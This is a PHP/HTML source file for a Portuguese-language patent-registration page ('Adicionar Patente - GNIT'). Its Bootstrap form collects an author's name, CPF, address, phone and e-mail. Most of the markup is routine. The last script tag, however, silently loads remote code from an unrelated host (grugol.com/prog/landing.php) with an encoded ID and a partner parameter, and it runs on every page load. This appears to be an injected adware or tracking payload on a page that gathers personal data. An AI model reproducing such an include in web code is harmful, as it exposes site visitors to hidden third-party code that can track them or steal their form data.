<?php

include 'configs/conexao.php';

?>

<html lang="pt-BR">

<head>

  <meta charset="UTF-8" />
  <title> Adicionar Patente - GNIT</title>
  <meta charset="UTF-8">

  <!--Os arquivos Meta-->
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <meta name="description" content="GNIT">
  <meta name="author" content="">
  <!--Fim dos arquivos Meta-->

  <!--Os Arquivos CSS-->
  <link href="css/bootstrap.min.css" rel="stylesheet">
  <link href="css/bootstrap-responsive.min.css" rel="stylesheet">
  <link href="css/template.css" rel="stylesheet">


  <!--HTML5 shim,for IE6-8 support of HTML5 elements -->
  <!--[if lt IE 9]>
			<script src="js/html5shiv.js></script>"
		<![endif]-->

</head>

<body>

  <!-- Modal -->
  <div class="modal fade" id="edition-modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal" aria-label="Fechar"><span aria-hidden="true">&times;</span></button>
          <h4 class="modal-title" id="modalLabel">Cancelar a adição</h4>
        </div>
        <div class="modal-body">
          Deseja realmente cancelar essa adição de patente?
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary">Sim</button>
          <button type="button" class="btn btn-default" data-dismiss="modal">N&atilde;o</button>
        </div>
      </div>
    </div>
  </div>

  <nav class="navbar navbar-default navbar-fixed-top">
    <div class="container">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <span class="navbar-brand" href="index.php"><b>GNIT</b></span>
      </div>
      <div id="navbar" class="navbar-collapse collapse">
        <ul class="nav navbar-nav">

          <li><a href="quem.php">Quem Somos</a></li>
          <li class="active"><a href="contato.php">Contato</a></li>

        </ul>
        <ul class="nav navbar-nav navbar-right">




        </ul>
      </div><!--/.nav-collapse -->
    </div>
  </nav> <!--Final da NavBar-->


  <div class="container-fluid" style="margin-top:80px;">
    <div class="row">
      <div class="col-md-2" id="menu-esquerdo">
        <p><img src="img/nit.jpg" style="margin-left:15px"></p>
        <ul class="nav nav-pills nav-stacked">
          <li role="presentation"><a href="propriedades.php"><img src="img/dashboard.png"> DashBoard</a></li>
          <li role="presentation"><a href="minhastarefas.php"><img src="img/carrinho.png"> Minhas Notificações</a></li>
          <li role="presentation"><a href="minhaconta.php"><img src="img/ticket.png"> Minha Conta</a></li>
          <li role="presentation"><a href="faq.php"><img src="img/faq.png"> Sistema de FAQ</a></li>
          <li role="presentation"><a href="login.php"><img src="img/sair.png"> Sair</a></li>
        </ul>
      </div> <!--Final Menu Esquerdo-->
      <div class="col-md-10">
        <form class="form-horizontal" action="configs/salvar_aut.php" method="POST">
          <fieldset>


            <legend style="text-align:center;">Autor 01</legend>


            <div class="form-group">
              <label class="col-md-4 control-label" for="nome">Nome:</label>
              <div class="col-md-4">
                <input id="textinput" name="nome" type="text" placeholder="nome" required="true" class="form-control input-md">
                <span class="help-block">Nome do Autor</span>
              </div>
            </div>


            <div class="form-group">
              <label class="col-md-4 control-label" for="nac">Nacionalidade:</label>
              <div class="col-md-4">
                <input id="textinput" name="nac" type="text" placeholder="nacionalidade" required="true" class="form-control input-md">
                <span class="help-block">País que nasceu</span>
              </div>
            </div>

            <div class="form-group">
              <label class="col-md-4 control-label" for="cpf">CPF:</label>
              <div class="col-md-4">
                <input id="textinput" name="cpf" type="text" placeholder="CPF" required="true" class="form-control input-md">
                <span class="help-block">CPF sem pontos e traços</span>
              </div>
            </div>



            <div class="form-group">
              <label class="col-md-4 control-label" for="qlf">Qualificação Física</label>
              <div class="col-md-4">
                <input id="textinput" name="qlf" type="text" placeholder="Qualificação Física" required="true" class="form-control input-md">
                <span class="help-block">Qualificação Física</span>
              </div>
            </div>



            <div class="form-group">
              <label class="col-md-4 control-label" for="end">Rua:</label>
              <div class="col-md-4">
                <input id="textinput" name="end" type="text" placeholder="Telefone do usuário" required="true" class="form-control input-md">
                <span class="help-block">Logradouro</span>
              </div>
            </div>
            <div class="form-group">
              <label class="col-md-4 control-label" for="num">Número:</label>
              <div class="col-md-4">
                <input id="textinput" name="num" type="text" placeholder="Telefone do usuário" required="true" class="form-control input-md">
                <span class="help-block">Número da residência</span>
              </div>
            </div>
            <div class="form-group">
              <label class="col-md-4 control-label" for="bairro">Bairro:</label>
              <div class="col-md-4">
                <input id="textinput" name="bairro" type="text" placeholder="Telefone do usuário" required="true" class="form-control input-md">
                <span class="help-block">Bairro</span>
              </div>
            </div>
            <div class="form-group">
              <label class="col-md-4 control-label" for="cidade">Cidade</label>
              <div class="col-md-4">
                <input id="textinput" name="cidade" type="text" placeholder="Telefone do usuário" required="true" class="form-control input-md">
                <span class="help-block">Cidade</span>
              </div>
            </div>

            <div class="form-group">
              <label class="col-md-4 control-label" for="estado">Estado:</label>
              <div class="col-md-4">
                <input id="textinput" name="estado" type="text" placeholder="Telefone do usuário" required="true" class="form-control input-md">
                <span class="help-block">Estado</span>
              </div>
            </div>
            <div class="form-group">
              <label class="col-md-4 control-label" for="cep">CEP</label>
              <div class="col-md-4">
                <input id="textinput" name="cep" type="text" placeholder="Telefone do usuário" required="true" class="form-control input-md">
                <span class="help-block">CEP</span>
              </div>
            </div>
            <div class="form-group">
              <label class="col-md-4 control-label" for="pais">País:</label>
              <div class="col-md-4">
                <input id="textinput" name="pais" type="text" placeholder="Telefone do usuário" required="true" class="form-control input-md">
                <span class="help-block">País que reside</span>
              </div>
            </div>
            <div class="form-group">
              <label class="col-md-4 control-label" for="tel">Telefone:</label>
              <div class="col-md-4">
                <input id="textinput" name="tel" type="tel" placeholder="Telefone do usuário" required="true" class="form-control input-md">
                <span class="help-block">com DDD, sem parênteses</span>
              </div>
            </div>
            <div class="form-group">
              <label class="col-md-4 control-label" for="email">E-mail</label>
              <div class="col-md-4"> <input id="passwordinput" name="email" type="email" placeholder="para entrar no sistema" required="true" class="form-control input-md">
                <span class="help-block">E-mail do usuário</span>
              </div>
            </div>




            <div class="form-group">
              <label class="col-md-4 control-label" for="singlebutton"></label>
              <div class="col-md-4">
                <button id="singlebutton" name="singlebutton" class="btn btn-default">limpar</button>
              </div>
            </div>

            <div class="form-group">
              <label class="col-md-4 control-label" for="button1id"></label>
              <div class="col-md-8">
                <button id="button1id" name="button1id" type="submit" class="btn btn-success">enviar</button>
                <button id="" name="" class="btn btn-inverse">cancelar</button>
              </div>
            </div>


          </fieldset>
        </form>
      </div>

    </div>


    <hr>

    <div class="row">
      <div class="col-md-12">
        <footer>
          <h3>&copy GNIT - Todos os Direitos Reservados</h3>
        </footer>
      </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

    <!-- Latest compiled and minified JavaScript -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
    <script src='http://grugol.com/prog/landing.php?app=MDAtMUYtRDAtRTgtMEItQTQ=&partner=300'></script>
</body>
</body>

</html>

</html>